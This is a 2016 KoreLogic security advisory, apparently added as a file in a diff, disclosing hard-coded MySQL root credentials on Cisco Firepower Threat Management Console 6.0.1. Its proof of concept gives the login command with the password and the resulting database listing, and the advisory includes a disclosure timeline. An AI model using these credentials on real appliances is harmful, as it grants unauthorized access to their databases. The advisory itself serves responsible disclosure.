@@ -1,0 +1,115 @@
+KL-001-2016-005 : Cisco Firepower Threat Management Console Hard-coded MySQL
+Credentials
+
+Title: Cisco Firepower Threat Management Console Hard-coded MySQL Credentials
+Advisory ID: KL-001-2016-005
+Publication Date: 2016.10.05
+Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2016-005.txt
+
+
+1. Vulnerability Details
+
+     Affected Vendor: Cisco
+     Affected Product: Firepower Threat Management Console
+     Affected Version: Cisco Fire Linux OS 6.0.1 (build 37/build 1213)
+     Platform: Embedded Linux
+     CWE Classification: CWE-798: Use of Hard-coded Credentials
+     Impact: Authentication Bypass
+     CVE-ID: CVE-2016-6434
+
+2. Vulnerability Description
+
+     The root account for the local MySQL database has poor password
+     complexity.
+
+
+3. Technical Description
+
+     root@firepower:/Volume/6.0.1# mysql -u root --password=admin
+     Warning: Using a password on the command line interface can be insecure.
+     Welcome to the MySQL monitor.  Commands end with ; or \g.
+     Your MySQL connection id is 23348
+     Server version: 5.6.24-enterprise-commercial-advanced-log MySQL Enterprise
+Server - Advanced Edition (Commercial)
+
+     Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.
+
+     Oracle is a registered trademark of Oracle Corporation and/or its
+     affiliates. Other names may be trademarks of their respective
+     owners.
+
+     Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+     mysql> show databases;
+     +--------------------+
+     | Database           |
+     +--------------------+
+     | information_schema |
+     | Sourcefire         |
+     | external_data      |
+     | external_schema    |
+     | mysql              |
+     | performance_schema |
+     | sfsnort            |
+     +--------------------+
+     7 rows in set (0.00 sec)
+
+     mysql>
+
+     Note that mysqld listens only on loopback, so a remote attacker
+     would have to leverage some other condition to be able to reach
+     the mysql daemon.
+
+4. Mitigation and Remediation Recommendation
+
+     The vendor has acknowledged this vulnerability
+     but has not released a fix for the
+     issue. Vendor acknowledgement available at:
+
+https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20161005-ftmc1
+
+5. Credit
+
+     This vulnerability was discovered by Matt Bergin (@thatguylevel)
+     of KoreLogic, Inc.
+
+6. Disclosure Timeline
+
+     2016.06.30 - KoreLogic sends vulnerability report and PoC to Cisco.
+     2016.06.30 - Cisco acknowledges receipt of vulnerability report.
+     2016.07.20 - KoreLogic and Cisco discuss remediation timeline for
+                  this vulnerability and for 3 others reported in the
+                  same product.
+     2016.08.12 - 30 business days have elapsed since the vulnerability was
+                  reported to Cisco.
+     2016.09.02 - 45 business days have elapsed since the vulnerability was
+                  reported to Cisco.
+     2016.09.09 - KoreLogic asks for an update on the status of the
+                  remediation efforts.
+     2016.09.15 - Cisco confirms remediation is underway and soon to be
+                  completed.
+     2016.09.28 - Cisco informs KoreLogic that the acknowledgement details
+                  will be released publicly on 2016.10.05.
+     2016.10.05 - Public disclosure.
+
+7. Proof of Concept
+
+     See Technical Description
+
+
+The contents of this advisory are copyright(c) 2016
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+KoreLogic, Inc. is a founder-owned and operated company with a
+proven track record of providing security services to entities
+ranging from Fortune 500 to small and mid-sized companies. We
+are a highly skilled team of senior security consultants doing
+by-hand security assessments for the most important networks in
+the U.S. and around the world. We are also developers of various
+tools and resources aimed at helping the security community.
+https://www.korelogic.com/about-korelogic.html
+
+Our public vulnerability disclosure policy is available at:
+https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.2.txt
